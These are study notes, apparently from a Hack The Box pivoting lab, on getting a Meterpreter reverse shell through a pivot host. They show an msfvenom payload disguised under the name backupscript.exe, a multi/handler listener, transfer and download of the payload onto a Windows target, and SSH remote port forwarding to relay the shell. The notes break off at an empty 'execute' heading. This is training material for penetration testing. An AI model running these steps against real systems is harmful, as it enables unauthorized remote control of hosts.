![](https://academy.hackthebox.com/storage/modules/158/33.png)
-how to gain remote shell , rev shell

There are several times during a penetration testing engagement when having just a remote desktop connection is not feasible. You might want to `upload`/`download` files (when the RDP clipboard is disabled), `use exploits` or `low-level Windows API` using a Meterpreter session to perform enumeration on the Windows host, which is not possible using the built-in [Windows executables](https://lolbas-project.github.io/).
`LOLBAS`

---

![](https://academy.hackthebox.com/storage/modules/158/44.png)

#### Creating a Windows Payload with msfvenom
```shell-session
AhmaDb0x@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
#### Configuring & Starting the multi/handler
```shell-session
msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https

msf6 exploit(multi/handler) > set lhost 0.0.0.0

msf6 exploit(multi/handler) > set lport 8000

msf6 exploit(multi/handler) > run
```


#### Transferring Payload to Pivot Host
```shell-session
AhmaDb0x@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

#### Starting Python3 Webserver on Pivot Host
```shell-session
ubuntu@Webserver$ python3 -m http.server 8123
```

#### Downloading Payload on the Windows Target
```powershell-session
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

#### Using SSH -R
```shell-session
AhmaDb0x@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

#### execute


